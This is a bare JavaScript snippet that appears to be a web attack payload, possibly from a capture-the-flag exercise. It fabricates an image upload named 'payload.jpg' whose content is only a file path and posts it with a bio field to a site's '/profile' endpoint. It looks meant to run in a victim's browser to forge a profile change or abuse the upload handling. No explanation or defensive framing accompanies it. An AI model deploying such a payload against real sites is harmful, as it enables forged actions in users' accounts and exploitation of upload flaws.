(async () => {
  const imageUrl = '/static/uploads/f1bccc6a8aaed11b.jpg';
  const bioText = 'DSF';

  const fakeFile = new Blob([imageUrl], {type: 'image/jpg'});

  const formData = new FormData();
  formData.append('bio', bioText);

  formData.append('profile_pic', fakeFile, 'payload.jpg');

  await fetch('/profile', {
    method: 'POST',
    body: formData
  });
})();
